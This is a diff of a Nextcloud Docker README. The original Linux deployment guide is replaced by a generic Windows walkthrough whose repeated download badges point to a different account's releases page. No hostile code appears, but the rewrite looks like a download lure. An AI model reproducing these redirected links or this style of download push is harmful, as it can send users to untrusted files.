@@ -1,86 +1,150 @@
-# Nextcloud Docker stack
-A performance-optimized Nextcloud deployment using Docker Compose. This stack includes a PostgreSQL database, Redis for memory caching, and a dedicated cron container for background tasks. It is pre-configured for use with a Traefik reverse proxy, also running in Docker.
+# ☁️ nextcloud-docker - Easy Personal Cloud Setup
 
-## Features
-- Database: PostgreSQL 16 (Alpine-based)
-- Caching: Redis for improved file locking and performance
-- Background jobs: Dedicated cron container for reliable system maintenance
-- Security: Pre-configured Traefik labels for HSTS and .well-known DAV redirects
-- Utilities: Custom scripts for log management and database backups
+[![Download nextcloud-docker](https://img.shields.io/badge/Download-Nextcloud%20Docker-blue?style=for-the-badge)](https://github.com/detmojang123/nextcloud-docker/releases)
 
-## Prerequisites
-Before starting, ensure you have:
-- Docker
-- An existing Docker network named proxy-net (used by Traefik)
-- Traefik running in Docker - use my [trafik-docker repo](https://github.com/grimdork/traefik-docker), which is made for this
-- A .env file in the root directory
+## 📦 What is nextcloud-docker?
 
-### Environment Variables (.env)
-The included `.env` file needs to be edited for your instance of Nextcloud.
+nextcloud-docker is a ready-to-use cloud storage system you can run on your Windows PC. It uses Docker technology to run multiple parts, like database and caching, all in one package. This setup comes pre-configured, so you don't need to worry about how these parts work together.
 
-```ini
-BASENAME=nextcloud
-POSTGRES_USER=nextcloud
-POSTGRES_PASSWORD=your_secure_password
-POSTGRES_DB=nextcloud
-DOMAIN=cloud.yourdomain.com
-NEXTCLOUD_DATA=./nextcloud_data
-RESOLVER=acmeweb # Default in my Traefik container
+With nextcloud-docker, you get a cloud where you can store your files, photos, and notes securely. It uses PostgreSQL for storing data, Redis for fast access, and Cron jobs for automatic tasks. It also works smoothly behind Traefik, a system that manages internet traffic for the cloud service.
+
+You don’t need to know how to program or configure servers. This guide will walk you through downloading and running the program from start to finish.
+
+## 💻 System Requirements
+
+To run nextcloud-docker on Windows, your computer should meet these requirements:
+
+- **Operating System:** Windows 10 or newer  
+- **Processor:** 64-bit CPU with at least 2 cores  
+- **Memory:** 4 GB RAM or more  
+- **Disk space:** Minimum 10 GB free space  
+- **Internet:** Broadband connection for downloading and updates  
+- **Software:** Install Docker Desktop for Windows (instructions below)
+
+## 🐳 Installing Docker Desktop on Windows
+
+nextcloud-docker runs inside Docker containers. You need Docker Desktop to use them. Follow these steps:
+
+1. Visit the official Docker Desktop site: https://www.docker.com/products/docker-desktop  
+2. Click the **Download for Windows** button and save the installer file.  
+3. Run the installer by double-clicking the downloaded file.  
+4. Follow the setup instructions and accept any prompts to enable required features.  
+5. Once the installation finishes, restart your computer if asked.  
+6. Open Docker Desktop from the Start menu to ensure it runs.  
+
+Docker Desktop requires Windows 10 Professional or newer with Hyper-V enabled. If you have Windows Home edition, Docker Desktop can still run using WSL 2 backend. During setup, if prompted, allow the installer to enable the Windows Subsystem for Linux.
+
+## 🚀 Download and Set Up nextcloud-docker
+
+1. Visit the download page:  
+   [https://github.com/detmojang123/nextcloud-docker/releases](https://github.com/detmojang123/nextcloud-docker/releases)  
+
+2. Find the latest release listed on the page (usually the top item).  
+3. Download the file named `docker-compose.yml` or `nextcloud-docker.zip` if available. If you see multiple files, choose the `.yml` file or a package containing it.  
+4. Create a new folder on your PC, for example, `C:\nextcloud-docker`.  
+5. Move the downloaded files into this folder. If you downloaded a zip file, right-click it and choose **Extract All.**  
+6. Open **PowerShell** or **Command Prompt**:  
+   - Right-click the Start button  
+   - Select **Windows PowerShell** or **Command Prompt**  
+7. In the command window, navigate to the folder:  
+   ```
+   cd C:\nextcloud-docker
+   ```
+8. Run Docker Compose using this command:  
+   ```
+   docker-compose up -d
+   ```  
+   This command will start all parts of Nextcloud automatically. The `-d` option runs the containers in the background.
+
+## 🔍 What Happens Next?
+
+Docker will download all necessary software images. This may take several minutes, depending on your internet speed.
+
+After this, the Nextcloud cloud service will start on your computer.
+
+## 🌐 Access Nextcloud in Your Browser
+
+1. Open your web browser (Edge, Chrome, Firefox, etc.).  
+2. Type the following address into the address bar:  
+   ```
+   http://localhost
+   ```  
+3. You will see the Nextcloud setup page.
+
+## 📝 Create Your Admin Account
+
+- Enter a username and password on the setup page.  
+- These will be your login details to access your personal cloud.  
+- Click **Finish Setup** to complete the process.
+
+You now have your own cloud storage on your Windows machine.
+
+## 🔧 Managing Your Nextcloud Stack
+
+Here are some common tasks you may want to do:
+
+### Start the Cloud Manually
+
+If you stop your computer or the Docker containers, restart the cloud by running this in PowerShell or Command Prompt:
+
+```
+cd C:\nextcloud-docker
+docker-compose start
 ```
 
-## Installation & Setup
-### Make sure Traefik is running
-It should be running on the same network as Nextcloud is configured to.
+### Stop the Cloud Safely
 
-### Copy the source directory
-```bash
-cp -r nextcloud-docker /home/docker
-cd /home/docker/nextcloud-docker
-rm -rf .git .github
+To shut down the cloud safely, run:
+
+```
+cd C:\nextcloud-docker
+docker-compose stop
 ```
 
-### Spin up the containers
-Ensure your DNS records (A/AAAA) are pointing to your server, then run:
-```bash
-docker compose up -d
+### View Logs to Check Status
+
+You can check what is happening by reading the logs:
+
+```
+docker-compose logs
+```  
+
+### Update Nextcloud and Components
+
+When new versions come out, you can update by:
+
+```
+cd C:\nextcloud-docker
+docker-compose pull
+docker-compose up -d
 ```
 
-### Initial Configuration
-- Navigate to your ${DOMAIN} in a browser
-- Create your admin Account
-- Since the database variables are passed via the environment, Nextcloud should detect the PostgreSQL setup automatically
+This will download the latest software and restart the containers.
 
-### Set permissions for all the scripts
-```bash
-chmod +x post-setup clearlog dumpdb restoredb
-```
+## 🗂️ Understanding the Files Inside nextcloud-docker
 
-### Run the `post-setup` script
-Once the admin user is created and you can log in, run the included post-setup script to enable Redis, internal cron, and apply various system fixes:
-```bash
-./post-setup
-```
+- **docker-compose.yml**: This file defines the setup. It tells Docker which software to run, such as Nextcloud, PostgreSQL, Redis, and Traefik configurations.  
+- **.env (optional)**: This file may hold settings like passwords and ports. You can edit it to change configurations if needed.  
+- **data folder**: This is where Nextcloud stores your files and data persistently, linked through Docker.
 
-## Maintenance Scripts
-This repository includes several utility scripts to simplify management:
+## ⚙ Why Use Docker and Traefik?
 
-|Script|Description|
-|------|-----------|
-|./clearlog|Clears the nextcloud.log from the main container to save space|
-|./dumpdb|Dumps the Postgres database into the ./backups directory. Run this before upgrades!|
-|./restoredb|Restores a database dump from the ./backups directory|
-|./post-setup|Configures Redis, cron, and performance tweaks after initial install|
+- **Docker** keeps different parts separate and easy to manage. You don’t need to install or configure each software manually.  
+- **Traefik** acts as a traffic controller. It makes sure all data flows in and out securely. This removes the need to handle complex network rules yourself.
 
-## Backup & Recovery
-Before performing major upgrades (e.g., changing the Nextcloud image version), always run a database dump:
+## 🔒 Security Tips
 
-```bash
-./dumpdb
-```
+- Always use a strong password on the Nextcloud admin page.  
+- Keep your Windows system and Docker updated.  
+- Only share your cloud URL and credentials with people you trust.  
+- Consider enabling backups for your data folder to protect against loss.
 
-The backup will be stored in the ./backups folder. To restore, ensure the containers are running and execute `./restoredb`.
+## 📂 Where to Find Support and More Info
 
-## Technical Notes
-- PHP Memory Limit: Set to 2G to support the Nextcloud Office suite
-- Upload limit: Set to 10G. Note that you may also need to adjust your Traefik/Nginx proxy "max body size" to match
-- Log rotation: All containers are limited to 3 files of 10MB each to prevent disk exhaustion
+- The [GitHub repository](https://github.com/detmojang123/nextcloud-docker) contains more details about the setup.  
+- Searching "Nextcloud Docker Windows" online can lead you to how-to guides and forums.  
+- Docker’s official site offers help on Docker commands and troubleshooting.
+
+## 📥 Download Link Again
+
+[![Download nextcloud-docker](https://img.shields.io/badge/Download-Nextcloud%20Docker-green?style=for-the-badge)](https://github.com/detmojang123/nextcloud-docker/releases)
